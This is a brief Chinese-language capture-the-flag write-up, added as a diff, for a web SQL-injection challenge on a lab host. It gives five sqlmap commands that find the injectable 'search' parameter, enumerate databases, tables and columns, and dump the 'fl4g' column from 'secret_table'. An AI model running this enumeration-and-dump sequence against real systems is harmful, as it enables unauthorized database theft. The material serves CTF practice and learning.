@@ -1,0 +1,22 @@
+1.获取注入点
+
+sqlmap -u http://192.168.100.161:53459 --data "search=df"
+
+2.获取数据库信息
+
+sqlmap -u http://192.168.100.161:53459 --data "search=df" --dbs
+
+3.获取库内表信息
+
+sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
+
+4.获取表内字段信息
+
+sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
+
+5.获取字段内容，得到flag
+
+sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
+
+
+參考: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686
